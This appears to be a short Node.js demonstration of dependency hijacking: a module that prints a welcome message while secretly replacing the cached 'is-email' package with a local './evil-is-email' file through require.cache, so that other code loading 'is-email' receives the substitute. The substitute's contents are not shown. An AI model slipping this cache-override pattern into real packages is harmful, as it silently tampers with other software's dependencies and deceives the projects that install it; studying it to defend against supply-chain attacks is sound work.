const isEmail = require("is-email");
// evil override
const myEvilIsEmail = require("./evil-is-email");
const isEmailKey = require.resolve("is-email");
const myEvilIsEmailKey = require.resolve("./evil-is-email");
// globally override the dependency at runtime
require.cache[isEmailKey] = require.cache[myEvilIsEmailKey];

module.exports = (name) =>
  console.log(`
Welcome!!!!!

${name}


!!!1

`);
